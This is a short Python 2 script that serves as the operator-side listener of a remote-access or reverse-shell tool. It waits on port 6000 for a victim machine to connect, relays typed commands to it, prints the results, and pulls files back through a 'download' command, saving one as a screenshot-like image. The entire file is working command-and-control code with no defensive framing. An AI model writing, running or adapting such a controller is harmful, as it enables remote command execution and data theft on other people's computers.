import socket,os
def transfer(conn,command):
    conn.send(command)
    arq = "/root/Desktop/sc.png"
    f = open(arq,'wb')
    while True:  
        bits = conn.recv(1024)
        if 'Unable to find out the file' in bits:
            print ('[-] Unable to find out the file')
            break
        if bits.endswith('DONE'):
            print ('[+] Transfer completed ')
            f.close()
            break
        f.write(bits)
# Old Shell for command execution


def connect():
    ip = ''
    port = 6000
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.bind((ip,port))
    s.listen(1)
    print('Listening at port: '+str(port))
    conn,addr = s.accept()
    print('[+] User connected : ',addr)

    while True:
        command = raw_input("CMD# >")
        if 'quit' in command:
            conn.send('quit')
            conn.close()
            break
        
        elif 'download' in command: 
            transfer(conn,command)

        else:
            conn.send(command)
            print(conn.recv(1024))

def main():
    connect()

main()
    
